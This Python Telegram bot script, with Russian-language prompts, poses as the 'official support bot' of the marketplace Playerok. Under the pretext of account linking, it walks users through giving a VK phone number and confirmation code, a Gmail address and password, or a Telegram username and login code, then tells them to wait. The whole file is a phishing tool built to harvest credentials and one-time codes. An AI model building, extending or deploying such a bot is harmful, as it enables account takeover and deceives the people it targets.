import telebot
import os
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

TOKEN = os.getenv("TOKEN")
bot = telebot.TeleBot(TOKEN)

state = {}

# --- КЛАВИАТУРА С КНОПКАМИ ---
def main_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_vk = KeyboardButton("/vk")
    btn_gmail = KeyboardButton("/gmail")
    btn_tg = KeyboardButton("/tg")
    markup.add(btn_vk, btn_gmail, btn_tg)
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "Здравствуйте!\n\n"
        "Это официальный бот поддержки Playerok.\n\n"
        "Выберите способ привязки:",
        reply_markup=main_keyboard()
    )

# --- VK ---
@bot.message_handler(commands=['vk'])
def vk(message):
    state[message.chat.id] = "vk_phone"
    bot.send_message(message.chat.id, "Вы выбрали ВКонтакте.\n\nВведите номер телефона VK:")

# --- GMAIL ---
@bot.message_handler(commands=['gmail'])
def gmail(message):
    state[message.chat.id] = "gmail_email"
    bot.send_message(message.chat.id, "Вы выбрали Gmail.\n\nВведите email:")

# --- TELEGRAM ---
@bot.message_handler(commands=['tg'])
def tg(message):
    state[message.chat.id] = "tg_username"
    bot.send_message(message.chat.id, "Вы выбрали Telegram.\n\nВведите ваш @username:")

# --- ОБРАБОТКА ---
@bot.message_handler(func=lambda message: True)
def handle(message):
    s = state.get(message.chat.id)
    
    if not s:
        return

    if s == "vk_phone":
        state[message.chat.id] = "vk_code"
        bot.send_message(message.chat.id, "Введите код подтверждения:")

    elif s == "vk_code":
        del state[message.chat.id]
        bot.send_message(message.chat.id, "Спасибо. Ожидайте...")
        # Вернуть клавиатуру после завершения
        bot.send_message(message.chat.id, "Можете выбрать другой способ:", reply_markup=main_keyboard())

    elif s == "gmail_email":
        state[message.chat.id] = "gmail_pass"
        bot.send_message(message.chat.id, "Введите пароль:")

    elif s == "gmail_pass":
        del state[message.chat.id]
        bot.send_message(message.chat.id, "Спасибо. Ожидайте...")
        bot.send_message(message.chat.id, "Можете выбрать другой способ:", reply_markup=main_keyboard())

    elif s == "tg_username":
        state[message.chat.id] = "tg_code"
        bot.send_message(message.chat.id, "Введите код подтверждения:")

    elif s == "tg_code":
        del state[message.chat.id]
        bot.send_message(message.chat.id, "Спасибо. Ожидайте...")
        bot.send_message(message.chat.id, "Можете выбрать другой способ:", reply_markup=main_keyboard())

if __name__ == "__main__":
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Ошибка: {e}")
